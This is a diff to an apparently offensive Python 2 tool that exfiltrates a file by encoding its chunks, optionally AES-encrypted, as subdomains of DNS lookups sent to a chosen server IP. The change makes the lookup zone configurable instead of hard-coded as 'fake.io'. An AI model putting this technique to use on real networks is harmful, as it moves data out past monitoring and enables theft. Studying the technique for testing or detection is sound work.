@@ -5,7 +5,6 @@ import getpass
 from lib.Crypt import CryptString
 
 PAYLOADS_LENGTH = 60
-FAKE_DOMAIN = 'fake.io'
 
 # Change payload length to allow for a iterator
 PAYLOADS_LENGTH = PAYLOADS_LENGTH - 4
@@ -40,7 +39,7 @@ def main(ip, file, identifier, xxd, secret):
 		iteration = 0
 		for payload in payloads:
 
-			payload_to_send = payload + '.' + FAKE_DOMAIN
+			payload_to_send = payload + '.' + fake_domain
 
 			print '[INFO] Sending lookup for :', payload_to_send
 			answer = my_resolver.query(payload_to_send, 'A')
@@ -72,9 +71,9 @@ def main(ip, file, identifier, xxd, secret):
 		for payload in payloads:
 
 			if payload.startswith('0000') or payload.startswith('0001') or payload.startswith('0002'):
-				payload_to_send = payload + '.' + FAKE_DOMAIN
+				payload_to_send = payload + '.' + fake_domain
 			else:
-				payload_to_send = str(iteration).rjust(4, '0') + payload + '.' + FAKE_DOMAIN
+				payload_to_send = str(iteration).rjust(4, '0') + payload + '.' + fake_domain
 
 			print '[INFO] Sending lookup for :', payload_to_send
 			answer = my_resolver.query(payload_to_send, 'A')
@@ -100,6 +99,8 @@ if __name__ == '__main__':
 						action='store_true', help='Enable questions to be `xxd -r` friendly (60 chars long)')
 	parser.add_option('-s', '--secret', dest='secret', default=False,
 						action='store_true', help='Set the secret used for the AES encryption')
+	parser.add_option('-d', '--domain', dest='domain', default='fake.io',
+						type='string', help='fake zone to use for generated lookups')
 
 	(options, args) = parser.parse_args()
 
@@ -121,6 +122,7 @@ if __name__ == '__main__':
 	file = options.file
 	identifier = options.ident
 	xxd = options.xxd
+	fake_domain = options.domain
 
 	# kick off the main loop
 	main(server_ip, file, identifier, xxd, secret)
